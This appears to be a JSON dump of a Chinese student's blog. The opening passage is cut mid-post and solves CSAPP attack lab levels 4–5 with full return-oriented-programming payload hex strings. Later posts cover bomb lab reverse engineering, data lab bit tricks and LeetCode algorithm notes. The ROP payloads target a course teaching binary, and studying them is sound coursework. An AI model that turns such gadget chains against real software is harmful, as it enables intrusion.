55 00 00 00 0035 39 62 39 39 37 66 61 level4上面三关是利用缓存区溢出进行代码注入攻击（CIA），后面的两关程序采用了防护方式无法进行代码注入，它们需使用面向返回（ROP）的攻击方式。 ROP的思路是既然无法注入自己的代码，那就在原代码中找我们需要的片段，然后拼凑成需要的程序 重复level2，我们需要把cookie的值移到rdi中，但不能编写汇编。可以先读入cookie，然后执行pop rdi，但给的gadget中没找到pop rdi，需要做一下中转。先找到pop rax的代码，查表知其编码为58，在rtarget的汇编中搜索58，可以在0x4019b5处找到，58具体的地址是0x4019ab 14019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 再找mov rax rdi的汇编，其编码为48 89 c7，在如下地方找到，具体地址为0x4019a2 14019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 于是有了答案：先读入40B空字符，然后分别读入0x4019ab、cookie、0x4019a2、touch2的地址 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00a2 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00 level5实验做到这就差不多了，该掌握的方法都过了一遍，这关是一个大综合，需要组织汇编然后在rtarget中找到相应的gadget，和上题一样注入，最后答案为： 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00cc 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0070 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 61","comments":true,"tags":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/tags/csapp/"}]},{"title":"labuladong-数组","date":"2022-09-20T09:59:38.000Z","path":"2022/09/20/labuladong-数组/","text":"26.删除有序数组中的重复项，83. 删除排序链表中的重复元素，27. 移除元素，167. 两数之和 II - 输入有序数组，5. 最长回文子串，303. 区域和检索 - 数组不可变，304. 二维区域和检索 - 矩阵不可变，1109. 航班预订统计，1094. 拼车，48. 旋转图像，58. 螺旋数组，76. 最小覆盖子串，438. 找到字符串中所有字母异位词，3. 无重复字符的最长子串 26. 删除有序数组中的重复项卡了半天，知道用双指针但不知道怎么移动。 用一个慢指针slow指示无重复数组，快指针fast在前面探路，当fast[i] != fast[i - 1]时说明fast指示的值可以加入数组，把它赋给nums[slow]，slow前移准备接收下一个数。fast每次迭代都移一次 83. 删除排序链表中的重复元素可以用上一题的思路，但其实一个指针即可，发现cur和cur-&gt;next值相同时就让cur指向下一个的下一个，否则正常后移。 27. 移除元素思路和26一模一样，slow指示“正常”的数组部分（之前是不重复，本题是非val）。fast探路找到符合条件的数之后（之前是nums[fast] != nums[fast - 1]，本题是nums[fast] != val）就进行复制并后移slow，遇到不正常的数则跳过不操作。fast每次都后移一位。 原地修改数组的模板如下： 123456789while(fast &lt; nums.size())&#123; if(nums[fast] != val / != nums[fast - 1]) //遇到正常数 &#123; nums[slow] = nums[fast]; //进行复制 slow++; //slow后移，准备接收下一个数 &#125; fast++;&#125; 167. 两数之和 II - 输入有序数组左右端各一个指针，判断大小然后移动即可，很常见的思路 5. 最长回文子串1、用之前dp求回文子串数目的方法，但这里不求数目，而是判断是回文子串后更新其最大长度和起点，最后返回s的最长回文子串 2、法1需要较多额外空间，更好的解法是中心扩散法。其实很符合直觉，就是选中起点，以起点为中心向两侧扩散（比较字符是否相同），字符相同说明符合回文串条件一直扩散。 这里的问题是如何扩散？因为回文串有两种，若长度为奇数如aba需要从一个字符开始扩散；而偶数长度的abba则需要从两个字符开始扩散，所以要兼顾两种扩散方式：遍历字符串选取起点i：0~size-1后同时计算以i为中心和以i, i + 1为中心的扩散结果，然后动态更新最大长度和起点。 303. 区域和检索 - 数组不可变前缀和数组，适合经常计算某区间元素和的题目，思路是暂存数组的前缀和，也就是建立累加数组，当我们求left-right的元素和时，问题转化为求0到right的元素和减去0到left - 1的元素和，这两个值就储存在pre_nums[right + 1]和pre_nums[left]处（因为前缀和数组第一个值为0，所以原数组的索引idx对于的是idx + 1） 304. 二维区域和检索 - 矩阵不可变上题的二维版本。建立二维pre数组，首先还是加多一层避免边界讨论，上一题是让数组加多一位，本题则是加一圈。之后计算累加和，在m[i] [j]处前缀和可以用pre[i - 1] [j] 和 pre[i] [j - 1]来求，但这两个前缀和重复计算了pre[i - 1] [j - 1]部分，需要减去，所以计算方法是： 1pre_matrix[i][j] = matrix[i - 1][j - 1] + pre_matrix[i - 1][j] + pre_matrix[i][j - 1] - pre_matrix[i - 1][j - 1]; 求(row1, col1)到(row2, col2)那就pre[row2] [col2]减去pre[row1 - 1] [col2]和pre[row2] [col1 - 1]，但这里也重复计算，多减了一次pre[row1 - 1] [col1 - 1]，要把它加上，所以计算方法是 1pre_matrix[row2 + 1][col2 + 1] - pre_matrix[row1][col2 + 1] - pre_matrix[row2 + 1][col1] + pre_matrix[row1][col1]; 注意一下pre的索引要在matrix基础上加1，故上式row2和col2都+1 1109. 航班预订统计差分数组，适合经常对数组某区间元素进行加减的题目。思路是先构造差分数组（nums[i] - nums[i - 1]），然后在区间的左端点left使diff[left] - val，让区间的右端点diff[right] + val，当我们复原数组时，也就是求前缀和，在端点处的加或减会扩散到后续的元素，这样就完成了整个区间的加减 本题我们遍历bookings统计端点的加减情况，然后求一次前缀和就可以了。 12345678910for(auto &amp;it : bookings)&#123; nums[it[0] - 1] += it[2]; if(it[1] &lt; nums.size()) nums[it[1]] -= it[2];&#125;for(int i = 1; i &lt; nums.size(); i++)&#123; nums[i] += nums[i - 1];&#125; 差分数组（求前缀和）-&gt; 原数组 -&gt; （求前缀和）前缀和数组 1094. 拼车和上题一样，求区间内的上车人数总数，用差分数组简化。注意在to下车，也就是说增加人数的区间是不包含to的，所以要在[from, to - 1]区间操作 48. 旋转图像二维矩阵的处理技巧，要顺时针旋转90°，方法是先按对角线镜像对称，然后每行进行反转。 沿对角线反转的方法可以看一下（由于题目是方阵，可以少用2个参数） 1234567for(int i = 0; i &lt; matrix.size(); i++) //i确定对角元素&#123; for(int j = i + 1; j &lt; matrix.size(); j++) //j沿右、下展开 &#123; swap(matrix[i][j], matrix[j][i]); &#125;&#125; 58. 螺旋数组螺旋数组1和2都是经典题目，用的是收缩边界方法，之前做过两次所以不再做了 76. 最小覆盖子串之前做过，但官解一个哈希表的方法每次都要遍历哈希表，非常耗时。这次用两个哈希表 一个哈希表统计ht统计字符串t每种字符的频次，一个哈希表hs统计s串中字符的频次 依然是滑动窗口，比较ht和hs右边界处的大小，若hs[s[right]] &lt;= ht[s[right]]，可以加入该字符，我们用一个变量cnt记录符合要求的字符数。之后收缩左边界，若hs[s[left]] &gt; ht[s[left]]，hs做减法并使left后移。当cnt == t.size()说明找完了所有字符，更新最小res 主要代码如下： 123456789101112131415161718192021222324252627unordered_map&lt;char, int&gt; hs;unordered_map&lt;char, int&gt; ht;int cnt = 0;int left = 0;int right = 0;string res = \"\";for(auto &amp;c : t) //统计t的字符频次&#123; ht[c]++;&#125;while(right &lt; s.size())&#123; hs[s[right]]++; //加入右边界的字符 if(hs[s[right]] &lt;= ht[s[right]]) //加完后&lt;=，说明这个字符是必需的，cnt+1 cnt++; while(hs[s[left]] &gt; ht[s[left]]) //左边界的字符有多余 &#123; hs[s[left]]--; //去除左边界字符 left++; //收缩左边界 &#125; //加入的字符满足t，且长度小于原来res的长度，更新res if(cnt == t.size() &amp;&amp; (res.empty() || res.size() &gt; right - left + 1)) &#123; res = s.substr(left, right - left + 1); &#125; right++; //扩张右边界&#125; 438. 找到字符串中所有字母异位词和上题基本一样，把求子串长度改为了求子串数目，所以判断条件变为cnt == t.size同时right - left + 1也等于t.size，这时找到一个完整子串，记录起点left 3. 无重复字符的最长子串一开始思维定式也想两个哈希表的方法，其实用一个哈希表记录当前子串频次即可。 还是滑动窗口，当遇到非正常情况时收缩左边界，前两题的情况时左边界不是t串字符，或其频次已经超过需求，所以收缩。本题则是出现重复，即hash[s[right]] &gt; 1时收缩左边直到恢复正常。 12345678hash[s[right]]++; while(hash[s[right]] &gt; 1) //有字符的频次大于1，即出现重复&#123; hash[s[left]]--; //除去左边界值并收缩 left++;&#125;res = max(res, right - left + 1);right++; 由于不用匹配子串，只要不重复即可，所以不需要cnt记录字符数目了，代码简洁了很多","comments":true,"tags":[{"name":"labuladong","slug":"labuladong","permalink":"http://yoursite.com/tags/labuladong/"}]},{"title":"labuladong-链表","date":"2022-09-15T08:53:20.000Z","path":"2022/09/15/labuladong-链表/","text":"86.分隔链表，23. 合并K个升序链表，876. 链表的中间结点，92. 反转链表 II，25. K 个一组翻转链表，234. 回文链表 86. 分隔链表一开始的思路是像快排那样交换两侧节点，但链式结构无法操作。本题保持相对顺序暗示了不做交换，而是把链表分成两部分，一部分小，一部分大，分完再合并即可。类似合并有序链表，可以利用哑节点的技巧。 23. 合并K个升序链表1、合并两个链表的推广，找每个链表头结点的最小值，记录这个节点，dummy接上并让该节点后移 2、用优先队列，法1每次都要遍历一次lists找最小节点，为了节省查找可以用一个优先队列保存size个节点，每次弹出堆顶的最小节点接到dummy后，然后把该节点的next加入到队列中，这样就能保证最小的size个数都在队列中。 876. 链表的中间结点快慢指针的经典运用 92. 反转链表 II在链表中间反转不如整体反转那样方便，它多了反转后左右链表连接的考虑 一般的反转是设置pre为新的头结点，cur为当前待反转节点，next暂存cur的下一节点 本题的方法是设置pre为待反转区域的前一节点，cur为当前节点，next为cur的下一节点，且把next作为操作对象，每次把next插入到pre之后。这样反转区域就总是和前面区域相连了，同时cur一直保持和后面区域的连接，避免了断链的问题 整体反转和部分反转的对比如下： 1234567891011ListNode *pre = nullptr; ListNode *cur = head;ListNode *next = nullptr;while(cur != nullptr)&#123; next = cur-&gt;next; cur-&gt;next = pre; pre = cur; cur = next;&#125;return pre; 12345678910ListNode *pre = ..; //移动到待反转区域之前ListNode *cur = pre-&gt;next;ListNode *next = nullptr;for(int i = 0; i &lt; right - left; i++)&#123; next = cur-&gt;next; cur-&gt;next = next-&gt;next; next-&gt;next = pre-&gt;next; pre-&gt;next = next;&#125; 25. K 个一组翻转链表和上题基本一样，就是要分组。先求链表长度len，分为len / k组，组内进行上一题的操作 234. 回文链表不考虑空间就先遍历一次放到栈里，再遍历一次比较是否相等 要求原地工作则反转一半的链表，然后比较前后两部分是否相同，先用快慢指针找到中点，然后反转后半部分。一个指针从头开始，一个指针从中点开始，一一比较","comments":true,"tags":[{"name":"labuladong","slug":"labuladong","permalink":"http://yoursite.com/tags/labuladong/"}]},{"title":"csapp-lab2","date":"2022-09-15T03:09:17.000Z","path":"2022/09/15/csapp-lab2/","text":"前置知识寄存器： rsp 标识栈顶 rdi rsi rdx 存储参数 eax 累加器 esi 源寄存器 gdb： x/s 输出指定内存的字符串 x/x 输出指定内存的十六进制表示 一共6关，每一关都要输入正确的字符串才能通过，给出可执行文件bomb，需要通过反汇编得到其汇编代码，阅读汇编代码判断正确的字符串 使用objdump -d bomb &gt; bomb.txt将反汇编结果输出到txt文件中便于阅读。 phase_1 代码比较短，忽略开辟空间的那部分，phase_1主要做了两件事：1、把esi存到地址0x402400处；2、调用函数比较两个字符串是否相等。eax存储函数的返回结果，查看strings_not_equal的代码可知若不相等返回1，相等返回0。 显然0x402400是个比较奇怪的地方，它在代码段找不到，又被用来比较字符串。通过gdb bomb，x/s 0x402400查看此处内容，发现一个字符串： Border relations with Canada have never been better. 这个就是答案 phase_2 主要代码如上，这里注意两个寄存器rbx和rsp，rsp存储了数组的第一个元素值，rbx是基址寄存器，用于存储数组的首地址，代码中rbx每次都后移4位，也就是移动到数组的下一个元素，相当于for循环。同时eax存储上一个rbx（上一个数组元素）并且乘2，并和rbx进行比较。用c语言表示就是a[i]和a[i - 1] * 2的比较。 输入几位呢？read_six_numbers暗示了答案，另一方面，可以发现依然有一个超过了代码段的怪地址0x40145c，用x/s查看发现等于%d %d %d %d %d %d，证实了输入6位数字。 第一个元素（rsp）必须是1，后面每一位都是前一位2倍，故答案为： 1 2 4 8 16 32 phase_3又出现了0x40145c，查看是：%d %d，说明这次需要输入2个数 两个参数rdx和rcx 代码主体由一系列跳转组成，跳转的结果取决于 jmpq *0x402470(,%rax,8) rax就是读入的第一个参数rdx，也就是要查看0x402470 + rax处的东西 可以看到这是一个跳转表，由0x402470的偏移决定跳转位置，而第一个参数0 &lt;= rax &lt;= 7正好对应了这8种跳转位置，若第一个参数为0，那么无偏移对应0x400f7c，也就是mov 207 eax，若第一个参数为1，那么偏移一格对应0x400fb9，也就是mov 207 eax……共8组答案： 0-207 1-311 2-707 3-256 4-389 5-206 6-682 7-327 phase_4本关输入和上一关有点类似，查看特殊地址0x4025cf发现 %d %d，也是输入2个数。同样存储在rdx和rcx中，从401056可知rcx必须等于0否则引爆，这就马上确定了第一个参数。再看第二个参数rdx，由401033知rdx &lt;= 14，然后调用func4 func4内主要是eax、edx、ecx这几个寄存器在做操作，耐心得理清楚可以得到以下代码： 12345678910111213int func4(int target, int a, int b)&#123; int ret = b - a; int k = (unsigned)(ret) &gt;&gt; 31; ret = (ret + k) &gt;&gt; 1; k = ret + a; if(k &gt; target) return 2 * func4(target, a, k - 1); ret = 0; if(k &lt; target) return 2 * func4(target, k + 1, b) + 1; return ret;&#125; （eax就是ret，edx就是b，ecx就是k，esi就是a，edi就是target） 已知a = 0， b = 14，且func4返回0才能不爆炸，edi（rdx）应该是多少？ 因为k&gt;=0，故target也要大于0，前面已知它&lt;=14，写个迭代即可 12345for(int i = 0; i &lt;= 14; i++)&#123; if(func4(i, 0, 14) == 0) printf(\"%d\\n\", i);&#125; 输出结果为0 1 3 7，所以有4组答案： 0 1 3 7 - 0 phase_5前面都差不多，开空间和限定输入长度。比较有意思的是这句： mov %fs:0x28,%rax 一开始不知道什么意思，后来才想起是书上讲的“金丝雀”，程序的最后判断了它是否被改过，改过则调用栈溢出的处理，不过本题没用上这个东西，只是带看了一眼。 回归正题，这里需要熟悉数组的汇编表示（第一句），括号中间的值rax是数组索引，注意到除了第一句后面401099也是一个数组，它是以0x4024b0为基地址，第一个数组的值rdx为索引的数组。 后续比较乱先跳过，看最后几行需要比较字符串，比较对象是esi和rdi，rdi的值rsp + 10就是之前的嵌套数组，x/s看一下esi 0x40245e的值：flyers 也就是说嵌套数组arr[4024b0 + rdx]的值要和该字符串相同，为了确定偏移大小，再看一下0x4024b0： 这是一个字符串，我们需要从中找到flyers，可以发现这6个字符的偏移分别是9、15、14、5、6、7，也就是我们输入的字符要转化为这些偏移量。如何转化？从401096可知取了读入字符的后4位，也就是读入字符ascii码的二进制后四位与这些偏移量相同即可。可以直接找以这些偏移量为ascii码的字符，但为了方便给每个偏移量加上96（0110 xxxx），这样不影响末4位，于是有答案： ionefg phase_6多少有点长了…… 做到此处基本没剩多少耐心了，汇编也没细看，从博客大概了解了一下思路。 首先读入6个数，然后对这些数进行限定，每个数都要小于等于6，该数组以rsp为基地址，r13为索引，但没完。4001138的mov (%rsp,%rax,4),%eax 从数组中得到偏移4位的数，也就是a[r13]的下一个数，如果相等则引爆，之后索引ebx后移一位，接着与rbx比较。也就是说每次先确定一个a[i]，之后从i + 1开始的数不能和a[i]相同，简而言之就是这6个数各不相同： 12345678for(int i = 0; i &lt; 6; i++)&#123; for(int j = i + 1; j &lt; 6; j++) &#123; if(a[j] == a[i]) bomb(); &#125;&#125; 下一部分很好理解，就是edx = 7 - a[i]，再把edx赋给a[i]。用7减去每个数得到新的数组a 再往后看，首先有一个奇怪的地址0x6032d： 这里有6个节点，第一列的值未知，第二列正好是1-6，第三列是下一节点的地址，所以这是一个链表。之后是一大堆循环的汇编，作用是修改链表的next指针，以第一列的那个参数为标准，链表应该是递减的。于是得到顺序3 4 5 6 1 2，这是由7-a[i]得来的，故原本的顺序为： 4 3 2 1 6 5 phase_secretbomb.c有一段注释： Wow, they got it! But isn’t something… missing? Perhaps. something they overlooked? Mua ha ha ha ha! 还藏东西了…在bomb的汇编文件中可以找到secret phase，它的触发条件是第四关的输入和0x402622处的东西进行比较，若相等则触发。查看0x402622发现是Dr.Evil，于是在第四关额外输入该字符串最后就能进入secret了。 fun7是一个递归函数，它的一个参数是0x6030f0，先看一眼 这次节点的内容更多，可以发现每个节点都有2个地址指向其他节点，很容易想到二叉树，罗列一下节点值会发现还是一棵二叉搜索树： ​ 24 ​ 8 32 ​ 6 16 2d 65 ​ 1 7 14 23 28 2f 63 3e9 需要读入一个值使fun7返回2才能避免爆炸，fun7的c表示为： 123456789101112int fun7(node *cur, int i)&#123; if(cur == null) return -1; int key = cur-&gt;val; if(i &gt; key) return 2 * fun7(cur-&gt;right, i) + 1; else if(i == key) return 0; else return 2 * fun7(cur-&gt;left, i);&#125; 要返回2有两种情况。因为递归到底返回0,非0数要i &gt; key时产生，产生后再乘2即可，所以可以先左后右，这样递归返回1然后乘2变为2，符合要求，此时答案为0x16即22；其实还能接着走，因为后续递归返回0并不影响，所以走到0x16后接着往左，0x14即20，所以答案为： 20 或 22 至此就完成全部bomb lab了，汇编麻烦的地方在于寄存器太乱了，不像变量那样直观有意义。第一次做这么底层的lab还是很生涩，对gdb、寄存器和函数参数都不熟悉，距离看完csapp第三章也过了半个月，所以很多常见汇编表示都认不出来。不过磕磕绊绊做完后还是很有成就感的，对底层的认识也提升了不少。","comments":true,"tags":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/tags/csapp/"}]},{"title":"csapp_lab1","date":"2022-09-15T02:54:41.000Z","path":"2022/09/15/csapp-lab1/","text":"bitor异或公式 1x ^ y = ~(x &amp; y) &amp; ~(~x &amp; ~y) tmin补码最小int为-2^31，即10000000… 令1左移31位即可： 11&lt;&lt;31 isTmax最大值是011111…即最小值取反，再通过异或判断是否相等即可： 1!(x ^ ~(1 &lt;&lt; 31)) allOddBits判断x是否等于AAAAAAA… ，通过异或即可实现 限制不能定义那么长的A，利用&lt;&lt;和|来实现，让AA移动8位得到AA00，再和原来的AA进行|（或者+）就能得到长度翻倍的AAAA，如法炮制得到8个A x &amp; d起到掩码的作用，把奇数位置零，再异或d判断是否相等 整体代码为： 1!((x &amp; d) ^ d); //d = AAAAAAAA negate由于 x + ~x = 1111… = -1，可得 1-x = ~x + 1 isAsciiDigit先判断前4位是否为0x3：( 经常用! 和 ^ 的组合代替 = ) 1a = !((x&gt;&gt;4) ^ 0x3); 再判断后4位（b = x &amp; 0xF）是否在0-9之间，由于无法直接比较大小，此处的思路是令b加上-10（c = ~0xA + 1）（利用上一题 取反加1的方法），若得到的结果是负数说明后四位在0-9之间符合要求 我们利用和10000…即0x8000做&amp;的方法判断符号位是否为1： 12int d = 0x1 &lt;&lt; 15; //符号位等于1，其他位等于0int e = !!(d &amp; (b + c)); 最后整合上述两个结果 a&amp;e 就是答案 conditionalx的值决定y和z的值，也就是x作为他们的掩码，首先需要把x转化为全1或全0 利用 !!x 把x转化为0或1，之后再利用 ~x + 1的技巧把0变为0000…，1变为1111… 然后用&amp;实现掩码即可： 1return (x &amp; y) | (~x &amp; z); isLessOrEqual考虑到溢出，不能直接通过 y - x 的符号判断 只有当 x，y同号时才能这样比较 当x，y异号时，若x为负数就能确定x &lt;= y了 123456789101112int a = ~x + 1; //-xint b = a + y; //y-xint flag = (b&gt;&gt;31) &amp; 0x1; //y-x的符号int c = 1&lt;&lt;31;int xf = x &amp; c;int yf = y &amp; c;int d = xf ^ yf; //xy符号相同为0, 不同为1d = (d&gt;&gt;31) &amp; 0x1;//1、符号相同且y-x符号为0，即y&gt;=x, 2、符号不同且x符号为1return (!d &amp; !flag) | (d &amp; (xf&gt;&gt;31) &amp; 0x1); logicalNeg还是取反加1这个性质，除了0和100000…以外的元素进行取反加1都得到相反数，一个数|相反数符号位就为1，10000… |自身之后符号位也为1，只有0取反加1得到自身，|之后符号位也是0。 因此同样右移31位，0得到全0，其他数得到全1 123int a = ~x + 1;int b = a | x;return (b&gt;&gt;31) + 1; howManyBits高位缺少的数由符号位补充，所以对正数要找从高到低位第一个1，对负数则是找0，首先将负数取反，将二者统一为找第一个1 对x不断进行截断，若高 n/2位有1存在，则低 n/2 位为是需要的，得到这样的值最后累加就是至少需要的位。 由题目样例要额外考虑符号位，所以最后加1 1234567891011121314151617int sign = x &gt;&gt; 31;x = (sign &amp; ~x) | (~sign &amp; x);//正数不变，负数取反//高16位有1存在，则得到10000即16，说明低16位是需要的（否则高位的1没意义）int b16 = !!(x &gt;&gt; 16) &lt;&lt; 4;x = x &gt;&gt; b16; //截断低16位int b8 = !!(x &gt;&gt; 8) &lt;&lt; 3;x = x &gt;&gt; b8;int b4 = !!(x &gt;&gt; 4) &lt;&lt; 2;x = x &gt;&gt; b4;int b2 = !!(x &gt;&gt; 2) &lt;&lt; 1;x = x &gt;&gt; b2;int b1 = !!(x &gt;&gt; 1);x = x &gt;&gt; b1;int b0 = !!x;return b0 + b1 + b2 + b4 + b8 + b16 + 1; floatScale2按照浮点数规则截出符号、指数、尾数3部分 分别处理非法输入、非规格数、规格数3种情况。非法输入直接返回，非规格数使尾数部分乘2，规格数使指数加1。 floatFloat2Int排除越界情况后，用符号、指数、尾数组成int结果 floatPower2找边界 一些等价操作和常见操作： a = b ! (a ^ b) -a ~a + 1 a != 0 !!a 取相反数 ~a + 1 取符号位 a &gt;&gt; 31 制造符号位 1 &lt;&lt;31 分支判断(x非0则a， x为0则b) (x &amp; a) | (~x &amp; b)","comments":true,"tags":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/tags/csapp/"}]},{"title":"代码随想录-其他","date":"2022-08-21T11:17:55.000Z","path":"2022/08/21/代码随想录-其他/","text":"包括841. 钥匙和房间，684. 冗余连接 841. 钥匙和房间卡了半小时想不出来… 一直在回溯搜索所有路线，然后去重….其实本题就是有向图的遍历，切入点在于钥匙，每当拿到一个钥匙就用这个钥匙去开其他房间，然后用一个visited数组记录开过的房间。完成所有遍历后再看这个visited数组是否全开过了。 所有很重要的一点是dfs函数要有一个key变量表示当前拿到的钥匙，每次dfs通过改变这个key实现 684. 冗余连接并查集用于将一系列节点合并成一棵二叉树。 当合并两个节点，且这两个节点的祖先节点相同，那么这两个节点必然是二叉树中不相连的两个节点，因为孤立节点的祖先是本身，不和任何节点同祖先，所以这两个节点都来自于二叉树。此时若连接这两个节点就会形成环。 以上就是并查集判断二叉树是否有环的原理，它需要借助并查集的几个基本操作，模板如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution &#123;public: vector&lt;int&gt; findRedundantConnection(vector&lt;vector&lt;int&gt;&gt;&amp; edges) &#123; init(edges.size()); for(auto &amp;e : edges) &#123; if(!join(e[0], e[1]))//加入边，若失败则返回 return e; &#125; return &#123;&#125;; &#125;private: vector&lt;int&gt; parent; void init(int n) &#123; parent.resize(n + 1); //初始化长度为节点数+1，因为题目从1开始 for(int i = 1; i &lt;= n; i++)//每个节点的初始祖先就是自己 &#123; parent[i] = i; &#125; &#125; int find(int u) &#123; if(u == parent[u])//孤立节点，直接返回自身 &#123; return u; &#125; else //递归向上找祖先节点 &#123; parent[u] = find(parent[u]);//路径压缩，同时更新查找过程节点的祖先节点 return parent[u]; &#125; &#125; bool join(int u, int v) &#123; u = find(u); v = find(v); if(u == v) //祖先相同，成环 return false; parent[v] = u; //把u接到v下面 return true; &#125;&#125;;","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-动态规划","date":"2022-08-20T11:41:35.000Z","path":"2022/08/20/代码随想录-动态规划/","text":"包括509. 斐波那契数，70. 爬楼梯，746. 使用最小花费爬楼梯，62. 不同路径，63. 不同路径 II，343. 整数拆分，96. 不同的二叉搜索树，416. 分割等和子集，1049. 最后一块石头的重量 II，494. 目标和，474. 一和零，518. 零钱兑换 II，377. 组合总和 Ⅳ，322. 零钱兑换，279. 完全平方数，139. 单词拆分，198. 打家劫舍，213. 打家劫舍 II，337. 打家劫舍 III，121. 买卖股票的最佳时机，122. 买卖股票的最佳时机 II，123. 买卖股票的最佳时机 III，188. 买卖股票的最佳时机 IV，309. 最佳买卖股票时机含冷冻期，714. 买卖股票的最佳时机含手续费，300. 最长递增子序列，674. 最长连续递增序列，718. 最长重复子数组，1143. 最长公共子序列，1035. 不相交的线，53. 最大子数组和，392. 判断子序列，115. 不同的子序列，583. 两个字符串的删除操作，72. 编辑距离，647. 回文子串，516. 最长回文子序列 509. 斐波那契数每个数都取决于它的前两个数，初始化后不停地向后滚动，本题只和前两个数有关无需开n位的dp数组，用两个变量滚动即可。 70. 爬楼梯爬一级有一种方法，f(1) = 1；爬二级有两种方法，f(2) = 2 爬n级楼梯有两种选择：f(n) = f(n - 1) + f(n - 2) 因此解法和斐波那契数列一样，只是初始值不同 746. 使用最小花费爬楼梯dp问题首先是要清楚dp数组的含义，一般是求什么设什么，本题当然是最小花费，dp[i]表示到第i级楼梯的最小花费。 再考虑dp[i]由什么决定，本题有两种跳法，想跳到dp[i]要么从i - 1跳一步，要么从i - 2跳两步，前者花费cost[i - 1]，后者花费cost[i - 2]，选择花费最少的 因此可得递推公式 dp[i] = min(dp[i - 1] + cost[i - 1], dp[i - 2] + cost[i - 2]) 可以随意选择起点不花费，故dp[0] = dp[1] = 0 62. 不同路径1、深度搜索，越界就停止，包含大量的重复计算，超时 2、动态规划，问什么设什么，要求不同路径数，所以设dp[i] [j]为从起点到这个格子的路径数，这样每个格子的路径数就取决于它左边和上面的格子，即： dp[i] [j] = dp[i - 1] [j] + dp[i] [j - 1]; 比较麻烦的是边界（从0开始会出现负数索引），注意到第一行和第一列都只有一种走法，可以先初始化为1，然后就能从1开始进行dp了。 63. 不同路径 II有障碍后dp分3种情况，一是左上都无障碍，和上题一样；二是左边有障碍或右边有障碍，只能走另一侧；三是左上都有障碍，那么此路不通，不可达。 如何区分障碍呢？题目标记为1，但这样会和正常的1混淆，故遍历格子，把1改成-1，顺带把第一行和第一列也初始化为1了。但注意这里有一个问题，当第一行或第一列遇到障碍1后，后面的格子都不可达了（它们只能走一个方向），都应该标为-1。可以设置两个标志位实现两种情况。 之后按上面的3种情况dp即可。不需要额外空间 343. 整数拆分1、贪心，尽可能地拆出3 2、dp，拆分选择可分为两种情况，从 i 中拆出 j ，若不再继续拆了则乘积结果为 i (i - j) ， 若接着拆 i dp[i - j]（dp代表进一步的拆分），二者取最大值就是要的结果。 96. 不同的二叉搜索树需要一点抽象能力，dp[i]表示i个结点的BST有几个，当根结点确定后，BST的树个数取决于左右子树的个数乘积 即 dp[i] = dp[left] * dp[right]，left和right代表子树结点数，且left + right = i - 1 如3个结点的数分为[0, 2], [1, 1], [2, 0]三种情况，即写为 dp[3] = dp[0] dp[2] + dp[1] dp[1] + dp[2] * dp[0] 空树和单结点都只有一种情况，dp[0] = dp[1] = 1，然后从i = 2向上推导即可。 01背包问题物品重量为weight = {…}， 物品值为value = {…}，背包重w 选取物品需要考虑重量和价值两个维度，用dp[i] [j]表示选取第i个物品时背包剩余可用重量为j，dp[i] [j]的值就是此时的总价值。 是否选取一个物品？ 若不选，重量不变，保持选择上一个物品的状态即 dp[i - 1] [j] 若选，上一个物品的基础上，剩余重量j要减去选择的物品重量weight[i]，价值则相应地增加value[i]，即 dp[i - 1] [j - weight[i]] + value[i] 为了价值最大化，取二者最大值，于是有dp表达式： dp[i] [j] = max(dp[i - 1] [j], dp[i - 1] [j - weight[i]] + value[i]) 注意到 从i - 1 到 i 的变化并不涉及weight 和 value，这个维度不是必须的 只保留j ：dp[j] = max(dp[j], dp[j - weight[i]] + value[i]) 但一维dp没有保存上一个物品的状态，而是通过右侧的数据依赖左侧的数据来完成规划，因此要从后往前倒序，确保右侧数依赖的是上一次dp的结果 总的模板如下： 123456789101112int bag(vector&lt;int&gt; &amp;weight, vector&lt;int&gt; &amp;value, int w)&#123; vector&lt;int&gt; dp(w + 1, 0);//存储从重量0到w的结果 for(int i = 0; i &lt; weight.size(); i++)//选择物品 &#123; for(int j = w; j &gt;= weight[i]; j--)//倒序更新dp数组，剩余可用重量j从w开始，weight[i]以下不能再放了 &#123; dp[j] = max(dp[j], dp[j - weight[i]] + value[i]); &#125; &#125; return dp[w];//重量为w的背包能得到的最大价值&#125; 直观来看就是尝试把一个物品尝试放入每种重量（0-w）的背包内，每种重量的背包更新最大价值 416. 分割等和子集集合总和为sum，本题等价于找到和为sum / 2的子集和 1、回溯：搜索所有结果，超时 2、抽象为01背包问题（真难…），把集合看作是一系列物品，因为我们要得到sum / 2，且只能得到 sum / 2，sum / 2就是01背包中的w。集合的值显然就是物品的价值value，那重量weight是怎么？也是集合的值，因为它同时也是代价，使需要的sum / 2减少了。 将上面模板的w改为sum / 2， weight、value改为nums即可。 1049. 最后一块石头的重量 II还是难在抽象，怎样才能使得剩下的重量最小？石头相碰其实就是减法，所以题目等价把集合分为两部分，并且两部分的和的差值尽可能小，最终差值就是结果 所以解法和上题一样，通过dp尽可能得到sum / 2，最终dp[sum / 2]就是其中一堆小于等于sum / 2的和，通过sum - dp[sum / 2] - dp[sum / 2]就能得到差值 494. 目标和有了上面两题的积累很容易判断出此题要用dp，题目要把集合分为正数和负数两个子集，且差值为target，所以一个集合和为part + target，另一个集合的和为part 有part + target + part = sum，只要把第二个part赋予负号就是题目条件。 原题等价于求集合中和为part + target 即 target + (sum - target) / 2的数目 上面两题只需要判断集合中是否存在一个给定值，本题则需要求存在几种组合， 所以dp[j]的含义就变成了容量为j 的背包有dp[j] 种方法得到目标和 